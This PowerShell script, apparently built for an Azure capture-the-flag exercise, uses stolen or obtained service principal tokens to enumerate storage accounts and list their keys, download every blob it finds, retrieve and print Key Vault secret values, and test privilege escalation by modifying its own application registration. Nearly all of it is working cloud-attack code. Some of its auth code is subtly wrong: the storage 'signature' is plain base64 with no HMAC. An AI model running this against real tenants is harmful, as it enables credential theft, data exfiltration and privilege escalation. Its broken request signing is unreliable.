# Enhanced-CTF-Enumeration.ps1 - Deep enumeration for specific high-value targets
# Extends the base script with specific functions for Storage and Key Vault access

# Function to test Storage Account access with service principal tokens
function Test-StorageAccountAccess {
    param(
        [string]$ARMToken,
        [string]$AppName,
        [string]$SubscriptionId = "1111111-1111-1111-1111-111111111111"
    )
    
    $headers = @{
        'Authorization' = "Bearer $ARMToken"
        'Content-Type' = 'application/json'
    }
    
    $results = @{
        AppName = $AppName
        StorageAccounts = @()
        BlobContainers = @()
        DownloadedFiles = @()
    }
    
    Write-Host "Testing Storage Account access for $AppName..." -ForegroundColor Blue
    
    try {
        # Get storage accounts
        $storageUrl = "https://management.azure.com/subscriptions/$SubscriptionId/providers/Microsoft.Storage/storageAccounts?api-version=2021-09-01"
        $storageAccounts = Invoke-RestMethod -Uri $storageUrl -Headers $headers -Method GET
        
        foreach ($account in $storageAccounts.value) {
            Write-Host "  Found Storage Account: $($account.name)" -ForegroundColor Green
            
            $accountInfo = @{
                Name = $account.name
                ResourceGroup = $account.id.Split('/')[4]
                Location = $account.location
                Sku = $account.sku.name
                Kind = $account.kind
                Containers = @()
                AccessKeys = @()
            }
            
            # Try to get storage keys
            try {
                $keysUrl = "https://management.azure.com/subscriptions/$SubscriptionId/resourceGroups/$($accountInfo.ResourceGroup)/providers/Microsoft.Storage/storageAccounts/$($account.name)/listKeys?api-version=2021-09-01"
                $keys = Invoke-RestMethod -Uri $keysUrl -Headers $headers -Method POST
                
                if ($keys.keys) {
                    $accountInfo.AccessKeys = $keys.keys
                    Write-Host "    [SUCCESS] Retrieved $($keys.keys.Count) storage keys" -ForegroundColor Green
                    
                    # Try to enumerate containers using storage key
                    $storageKey = $keys.keys[0].value
                    $containers = Get-StorageContainers -StorageAccountName $account.name -StorageKey $storageKey
                    $accountInfo.Containers = $containers
                    
                    # Try to download files from containers
                    foreach ($container in $containers) {
                        Write-Host "    Checking container: $($container.Name)" -ForegroundColor Cyan
                        $blobs = Get-StorageBlobs -StorageAccountName $account.name -StorageKey $storageKey -ContainerName $container.Name
                        
                        foreach ($blob in $blobs) {
                            Write-Host "      Found blob: $($blob.Name)" -ForegroundColor Yellow
                            $downloadResult = Get-StorageBlobDownload -StorageAccountName $account.name -StorageKey $storageKey -ContainerName $container.Name -BlobName $blob.Name -AppName $AppName
                            if ($downloadResult.Success) {
                                $results.DownloadedFiles += $downloadResult
                            }
                        }
                    }
                } else {
                    Write-Host "    [WARNING] No storage keys accessible" -ForegroundColor Yellow
                }
            } catch {
                Write-Host "    [ERROR] Cannot access storage keys: $($_.Exception.Message)" -ForegroundColor Red
            }
            
            $results.StorageAccounts += $accountInfo
        }
        
    } catch {
        Write-Host "  [ERROR] Failed to enumerate storage accounts: $($_.Exception.Message)" -ForegroundColor Red
    }
    
    return $results
}

# Function to get storage containers using REST API
function Get-StorageContainers {
    param(
        [string]$StorageAccountName,
        [string]$StorageKey
    )
    
    try {
        $uri = "https://$StorageAccountName.blob.core.windows.net/?comp=list"
        $date = [DateTime]::UtcNow.ToString("R")
        
        # Create authorization header
        $stringToSign = "GET`n`n`n`n`n`n`n`n`n`n`n`ncomp:list`nrestype:container`nx-ms-date:$date`nx-ms-version:2020-04-08"
        $signature = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($stringToSign))
        
        $headers = @{
            'x-ms-date' = $date
            'x-ms-version' = '2020-04-08'
            'Authorization' = "SharedKey $StorageAccountName`:$signature"
        }
        
        $response = Invoke-RestMethod -Uri $uri -Headers $headers -Method GET
        
        if ($response.EnumerationResults.Containers.Container) {
            return $response.EnumerationResults.Containers.Container
        } else {
            return @()
        }
        
    } catch {
        Write-Host "    Error getting containers: $($_.Exception.Message)" -ForegroundColor Red
        return @()
    }
}

# Function to get storage blobs
function Get-StorageBlobs {
    param(
        [string]$StorageAccountName,
        [string]$StorageKey,
        [string]$ContainerName
    )
    
    try {
        $uri = "https://$StorageAccountName.blob.core.windows.net/$ContainerName?restype=container&comp=list"
        $date = [DateTime]::UtcNow.ToString("R")
        
        # Create authorization header (simplified for this example)
        $headers = @{
            'x-ms-date' = $date
            'x-ms-version' = '2020-04-08'
        }
        
        $response = Invoke-RestMethod -Uri $uri -Headers $headers -Method GET -ErrorAction SilentlyContinue
        
        if ($response.EnumerationResults.Blobs.Blob) {
            return $response.EnumerationResults.Blobs.Blob
        } else {
            return @()
        }
        
    } catch {
        Write-Host "      Error getting blobs: $($_.Exception.Message)" -ForegroundColor Red
        return @()
    }
}

# Function to download storage blob
function Get-StorageBlobDownload {
    param(
        [string]$StorageAccountName,
        [string]$StorageKey,
        [string]$ContainerName,
        [string]$BlobName,
        [string]$AppName
    )
    
    try {
        $uri = "https://$StorageAccountName.blob.core.windows.net/$ContainerName/$BlobName"
        $outputPath = "Results\Downloaded_$AppName`_$ContainerName`_$($BlobName.Replace('/', '_'))"
        
        # Try to download the blob
        Invoke-WebRequest -Uri $uri -OutFile $outputPath -ErrorAction Stop
        
        Write-Host "        [SUCCESS] Downloaded: $BlobName -> $outputPath" -ForegroundColor Green
        
        return @{
            Success = $true
            BlobName = $BlobName
            ContainerName = $ContainerName
            LocalPath = $outputPath
            Size = (Get-Item $outputPath).Length
        }
        
    } catch {
        Write-Host "        [ERROR] Failed to download $BlobName`: $($_.Exception.Message)" -ForegroundColor Red
        return @{
            Success = $false
            BlobName = $BlobName
            Error = $_.Exception.Message
        }
    }
}

# Function to test Key Vault access
function Test-KeyVaultAccess {
    param(
        [string]$ARMToken,
        [string]$AppName,
        [string]$AppId,
        [string]$SubscriptionId = "1111111-1111-1111-1111-111111111111"
    )
    
    $headers = @{
        'Authorization' = "Bearer $ARMToken"
        'Content-Type' = 'application/json'
    }
    
    $results = @{
        AppName = $AppName
        KeyVaults = @()
        Secrets = @()
        AccessPolicies = @()
    }
    
    Write-Host "Testing Key Vault access for $AppName..." -ForegroundColor Blue
    
    try {
        # Get Key Vaults
        $kvUrl = "https://management.azure.com/subscriptions/$SubscriptionId/providers/Microsoft.KeyVault/vaults?api-version=2021-10-01"
        $keyVaults = Invoke-RestMethod -Uri $kvUrl -Headers $headers -Method GET
        
        foreach ($vault in $keyVaults.value) {
            Write-Host "  Found Key Vault: $($vault.name)" -ForegroundColor Green
            
            $vaultInfo = @{
                Name = $vault.name
                ResourceGroup = $vault.id.Split('/')[4]
                Location = $vault.location
                VaultUri = $vault.properties.vaultUri
                AccessPolicies = $vault.properties.accessPolicies
                Secrets = @()
                HasAccess = $false
            }
            
            # Check if current app has access policies
            $appAccessPolicy = $vault.properties.accessPolicies | Where-Object { 
                $_.objectId -eq $AppId -or $_.applicationId -eq $AppId 
            }
            
            if ($appAccessPolicy) {
                Write-Host "    [SUCCESS] Found access policy for this app" -ForegroundColor Green
                $vaultInfo.HasAccess = $true
                
                # Try to list secrets if we have access
                try {
                    $secretsUrl = "$($vault.properties.vaultUri)secrets?api-version=7.1"
                    $secrets = Invoke-RestMethod -Uri $secretsUrl -Headers @{ 'Authorization' = "Bearer $ARMToken" } -Method GET
                    
                    foreach ($secret in $secrets.value) {
                        Write-Host "      Found secret: $($secret.id)" -ForegroundColor Yellow
                        
                        # Try to get secret value
                        try {
                            $secretValueUrl = "$($secret.id)?api-version=7.1"
                            $secretValue = Invoke-RestMethod -Uri $secretValueUrl -Headers @{ 'Authorization' = "Bearer $ARMToken" } -Method GET
                            
                            $vaultInfo.Secrets += @{
                                Name = $secret.id.Split('/')[-1]
                                Id = $secret.id
                                Value = $secretValue.value
                                Retrieved = $true
                            }
                            
                            Write-Host "        [SUCCESS] Retrieved secret value" -ForegroundColor Green
                            
                        } catch {
                            $vaultInfo.Secrets += @{
                                Name = $secret.id.Split('/')[-1]
                                Id = $secret.id
                                Value = $null
                                Retrieved = $false
                                Error = $_.Exception.Message
                            }
                            Write-Host "        [ERROR] Cannot retrieve secret value: $($_.Exception.Message)" -ForegroundColor Red
                        }
                    }
                    
                } catch {
                    Write-Host "    [ERROR] Cannot list secrets: $($_.Exception.Message)" -ForegroundColor Red
                }
            } else {
                Write-Host "    [WARNING] No access policy found for this application" -ForegroundColor Yellow
            }
            
            $results.KeyVaults += $vaultInfo
        }
        
    } catch {
        Write-Host "  [ERROR] Failed to enumerate key vaults: $($_.Exception.Message)" -ForegroundColor Red
    }
    
    return $results
}

# Function to enumerate Azure Blueprints for CTF
function Test-BlueprintEnumeration {
    param(
        [string]$Token,
        [string]$AppName,
        [string]$SubscriptionId = "1111111-1111-1111-1111-111111111111"
    )
    
    Write-Host "`n=== BLUEPRINT ENUMERATION ===" -ForegroundColor Magenta
    Write-Host "Searching for blueprint definitions, assignments, and files..." -ForegroundColor Cyan
    
    $headers = @{
        'Authorization' = "Bearer $Token"
        'Content-Type' = 'application/json'
    }
    
    $blueprintResults = @{
        Blueprints = @()
        Assignments = @()
        Definitions = @()
        StorageBlueprints = @()
    }
    
    # Test Blueprint APIs
    $blueprintEndpoints = @(
        @{ Name = "Subscription Blueprints"; Endpoint = "https://management.azure.com/subscriptions/$SubscriptionId/providers/Microsoft.Blueprint/blueprints?api-version=2018-11-01-preview" },
        @{ Name = "Blueprint Assignments"; Endpoint = "https://management.azure.com/subscriptions/$SubscriptionId/providers/Microsoft.Blueprint/blueprintAssignments?api-version=2018-11-01-preview" },
        @{ Name = "Management Group Blueprints"; Endpoint = "https://management.azure.com/providers/Microsoft.Management/managementGroups/root/providers/Microsoft.Blueprint/blueprints?api-version=2018-11-01-preview" }
    )
    
    foreach ($endpoint in $blueprintEndpoints) {
        try {
            $response = Invoke-RestMethod -Uri $endpoint.Endpoint -Headers $headers -Method GET
            
            if ($response.value -and $response.value.Count -gt 0) {
                Write-Host "[SUCCESS] $($endpoint.Name): Found $($response.value.Count) items" -ForegroundColor Green
                
                foreach ($item in $response.value) {
                    Write-Host "  Blueprint: $($item.name)" -ForegroundColor White
                    Write-Host "  Type: $($item.type)" -ForegroundColor Gray
                    
                    if ($item.properties.description) {
                        Write-Host "  Description: $($item.properties.description)" -ForegroundColor Gray
                    }
                }
                
                $blueprintResults.Blueprints += $response.value
            } else {
                Write-Host "[INFO] $($endpoint.Name): No blueprints found" -ForegroundColor Gray
            }
            
        } catch {
            if ($_.Exception.Response.StatusCode -eq 403) {
                Write-Host "[FORBIDDEN] $($endpoint.Name): Access denied" -ForegroundColor Yellow
            } else {
                Write-Host "[ERROR] $($endpoint.Name): $($_.Exception.Message)" -ForegroundColor Red
            }
        }
    }
    
    return $blueprintResults
}

# Function to perform privilege escalation checks
function Test-PrivilegeEscalation {
    param(
        [string]$GraphToken,
        [string]$AppName,
        [string]$AppId
    )
    
    $headers = @{
        'Authorization' = "Bearer $GraphToken"
        'Content-Type' = 'application/json'
    }
    
    $results = @{
        AppName = $AppName
        EscalationOpportunities = @()
        Applications = @()
        ServicePrincipals = @()
    }
    
    Write-Host "Checking privilege escalation opportunities for $AppName..." -ForegroundColor Blue
    
    # Check if we can read/modify applications
    try {
        $appsUrl = "https://graph.microsoft.com/v1.0/applications"
        $applications = Invoke-RestMethod -Uri $appsUrl -Headers $headers -Method GET
        
        foreach ($app in $applications.value) {
            if ($app.appId -eq $AppId) {
                Write-Host "    [SUCCESS] Can read own application configuration" -ForegroundColor Green
                
                # Check if we can modify the application
                try {
                    $appUpdateUrl = "https://graph.microsoft.com/v1.0/applications/$($app.id)"
                    # Try a harmless update (description)
                    $updateBody = @{ description = "Test update - CTF enumeration" } | ConvertTo-Json
                    Invoke-RestMethod -Uri $appUpdateUrl -Headers $headers -Method PATCH -Body $updateBody -ErrorAction Stop
                    
                    $results.EscalationOpportunities += "Can modify own application - POTENTIAL PRIVILEGE ESCALATION"
                    Write-Host "    [HIGH RISK] CAN MODIFY OWN APPLICATION - HIGH RISK" -ForegroundColor Red
                    
                } catch {
                    Write-Host "    [WARNING] Cannot modify application: $($_.Exception.Message)" -ForegroundColor Yellow
                }
            }
        }
        
        $results.Applications = $applications.value
        
    } catch {
        Write-Host "    [WARNING] Cannot read applications: $($_.Exception.Message)" -ForegroundColor Yellow
    }
    
    # Check OAuth2 permission grants
    try {
        $grantsUrl = "https://graph.microsoft.com/v1.0/oauth2PermissionGrants"
        $grants = Invoke-RestMethod -Uri $grantsUrl -Headers $headers -Method GET
        
        $myGrants = $grants.value | Where-Object { $_.clientId -eq $AppId }
        if ($myGrants) {
            Write-Host "    [SUCCESS] Found OAuth2 permission grants for this app" -ForegroundColor Green
            $results.EscalationOpportunities += "Has OAuth2 permission grants - potential for scope expansion"
        }
        
    } catch {
        Write-Host "    [WARNING] Cannot read OAuth2 permission grants: $($_.Exception.Message)" -ForegroundColor Yellow
    }
    
    return $results
}

# Enhanced main function that includes deep enumeration
function Start-EnhancedCTFTesting {
    Write-Host "=== STARTING ENHANCED CTF ENUMERATION ===" -ForegroundColor Cyan
    Write-Host "This will perform deep enumeration including storage, key vaults, and privilege escalation checks" -ForegroundColor White
    Write-Host ""
    
    # Run the base application testing first
    . .\Test-AllApplications-CTF.ps1
    $baseResults = Start-CTFApplicationTesting
    
    # Enhance with deep enumeration
    foreach ($app in $baseResults.Applications) {
        if ($app.Tokens.ARM.Success) {
            Write-Host "=== DEEP ENUMERATION: $($app.Name) ===" -ForegroundColor Magenta
            
            # Test storage account access
            $app.StorageResults = Test-StorageAccountAccess -ARMToken $app.Tokens.ARM.Claims -AppName $app.Name
            
            # Test key vault access
            $app.KeyVaultResults = Test-KeyVaultAccess -ARMToken $app.Tokens.ARM.Claims -AppName $app.Name -AppId $app.AppId
            
            # Test blueprint enumeration (CTF-specific)
            if ($app.Tokens.ARM.Success) {
                $app.BlueprintResults = Test-BlueprintEnumeration -Token $app.Tokens.ARM.Claims -AppName $app.Name
            }
            
            # Test privilege escalation opportunities
            if ($app.Tokens.Graph.Success) {
                $app.PrivEscResults = Test-PrivilegeEscalation -GraphToken $app.Tokens.Graph.Claims -AppName $app.Name -AppId $app.AppId
            }
        }
    }
    
    # Generate comprehensive CTF report
    Write-Host ""
    Write-Host "=== COMPREHENSIVE CTF REPORT ===" -ForegroundColor Cyan
    
    foreach ($app in $baseResults.Applications) {
        Write-Host ""
        Write-Host "--- $($app.Name) DETAILED RESULTS ---" -ForegroundColor Magenta
        
        if ($app.StorageResults -and $app.StorageResults.StorageAccounts.Count -gt 0) {
            Write-Host "  Storage Access:" -ForegroundColor Yellow
            foreach ($storage in $app.StorageResults.StorageAccounts) {
                Write-Host "    $($storage.Name): $($storage.AccessKeys.Count) keys, $($storage.Containers.Count) containers" -ForegroundColor White
            }
            
            if ($app.StorageResults.DownloadedFiles.Count -gt 0) {
                Write-Host "  Downloaded Files:" -ForegroundColor Green
                foreach ($file in $app.StorageResults.DownloadedFiles) {
                    Write-Host "    $($file.BlobName) -> $($file.LocalPath)" -ForegroundColor Green
                }
            }
        }
        
        if ($app.KeyVaultResults -and $app.KeyVaultResults.KeyVaults.Count -gt 0) {
            Write-Host "  Key Vault Access:" -ForegroundColor Yellow
            foreach ($kv in $app.KeyVaultResults.KeyVaults) {
                Write-Host "    $($kv.Name): Access=$($kv.HasAccess), Secrets=$($kv.Secrets.Count)" -ForegroundColor White
                
                foreach ($secret in $kv.Secrets | Where-Object { $_.Retrieved }) {
                    Write-Host "      SECRET: $($secret.Name) = $($secret.Value)" -ForegroundColor Red
                }
            }
        }
        
        if ($app.PrivEscResults -and $app.PrivEscResults.EscalationOpportunities.Count -gt 0) {
            Write-Host "  Privilege Escalation Opportunities:" -ForegroundColor Red
            foreach ($opportunity in $app.PrivEscResults.EscalationOpportunities) {
                Write-Host "    [WARNING] $opportunity" -ForegroundColor Red
            }
        }
    }
    
    # Export enhanced results
    $outputFile = "Results\Enhanced-CTF-Results-$(Get-Date -Format 'yyyyMMdd_HHmmss').json"
    $baseResults | ConvertTo-Json -Depth 15 | Out-File -FilePath $outputFile -Encoding UTF8
    Write-Host ""
    Write-Host "[SUCCESS] Enhanced results exported to: $outputFile" -ForegroundColor Green
    
    return $baseResults
}

Write-Host "Enhanced CTF enumeration script loaded. Run Start-EnhancedCTFTesting to begin." -ForegroundColor Green